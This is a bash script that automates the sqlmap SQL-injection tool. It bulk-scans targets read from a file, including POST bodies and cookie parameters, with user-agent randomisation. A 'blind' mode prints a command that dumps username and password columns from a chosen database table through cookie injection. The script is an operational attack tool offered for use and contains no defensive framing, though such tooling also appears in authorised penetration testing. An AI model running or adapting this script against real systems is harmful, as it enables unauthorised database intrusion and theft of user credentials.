#!/bin/bash

# Usage: run_sqlmap.sh <targets_file> <output_dir> [extra_args...]

if [ "$1" == "blind" ]; then
    # Usage: run_sqlmap.sh blind <url> <cookie_string> <dbms> <cookie_param> <table> <username_col>,<password_col>
    if [ $# -lt 7 ]; then
        echo "Usage: $0 blind <url> <cookie_string> <dbms> <cookie_param> <table> <columns>"
        exit 1
    fi
    url="$2"
    cookie_str="$3"
    dbms="$4"
    param="$5"
    table="$6"
    cols="$7"
    
    echo "sqlmap -u \"$url\" --cookie=\"$cookie_str\" --dbms=$dbms --technique=E --level=3 --risk=2 --batch --threads=1 -p $param -T $table -C $cols --dump --random-agent"
    exit 0
fi

if [ $# -lt 2 ]; then
    echo "Usage: $0 <targets_file> <output_dir> [extra_args...]"
    echo "       $0 blind <url> <cookie_string> <dbms> <cookie_param> <table> <columns>"
    exit 1
fi

TARGETS_FILE="$1"
OUT_DIR="$2"
shift 2

echo "[*] Starting SQLMap bulk scan"

# Prepare cookie arg
COOKIE_ARG=""
if [ -n "$COOKIE" ]; then
    COOKIE_ARG="--cookie=\"$COOKIE\""
fi

# Read targets and run sqlmap
while IFS='|' read -r method url data params || [ -n "$method" ]; do
    [ -z "$method" ] && continue
    [ "$method" == "COOKIE" ] && [ -z "$url" ] && continue # Skip global cookie markers
    
    echo "Scanning ($method): $url"
    
    # Prepare arguments (defaults that can be overridden by $@)
    # Added --flush-session and --fresh-queries to ensure clean, accurate scans per target
    ARGS=("-u" "$url" "--batch" "--random-agent" "--output-dir=$OUT_DIR" "--flush-session" "--fresh-queries" "$@")
    
    if [ -n "$params" ]; then
        echo "    [*] Targeting specific parameters: $params"
        ARGS+=("-p" "$params")
    fi

    if [ "$method" == "POST" ]; then
        ARGS+=("--data=$data")
        [ -n "$COOKIE" ] && ARGS+=("--cookie=$COOKIE")
    elif [ "$method" == "COOKIE" ]; then
        if [ -n "$COOKIE" ]; then
            ARGS+=("--cookie=$COOKIE; $data")
        else
            ARGS+=("--cookie=$data")
        fi
    else
        [ -n "$COOKIE" ] && ARGS+=("--cookie=$COOKIE")
    fi

    # Run sqlmap
    sqlmap "${ARGS[@]}"
done < "$TARGETS_FILE"

echo "[*] SQLMap scan complete"
